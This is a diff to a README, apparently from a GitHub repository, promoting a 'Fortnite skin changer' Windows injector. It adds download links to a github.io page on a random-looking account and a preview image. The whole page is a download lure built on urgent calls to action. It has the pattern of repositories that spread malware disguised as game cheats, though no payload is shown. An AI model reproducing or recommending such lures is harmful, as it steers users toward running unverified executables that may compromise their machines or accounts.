@@ -6,7 +6,7 @@ A Fortnite skin changer is a Windows utility that swaps cosmetic appearances ins
 
 # 📥 **INJECTOR PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INJECTOR**]( )
+## [⬇️ **GET THE WINDOWS INJECTOR**](https://juigtlglznls.github.io/Fortnite-Skin-Changer-Skins-Swapper/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A Fortnite skin changer is a Windows utility that swaps cosmetic appearances ins
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= preview image">
+<img src="https://github.com/juigtlglznls/Fortnite-Skin-Changer-Skins-Swapper/blob/main/fortnite%20skin%20swapper.png?raw=true" width="1280" height="720" alt= preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://juigtlglznls.github.io/Fortnite-Skin-Changer-Skins-Swapper/)
 
 ---
 
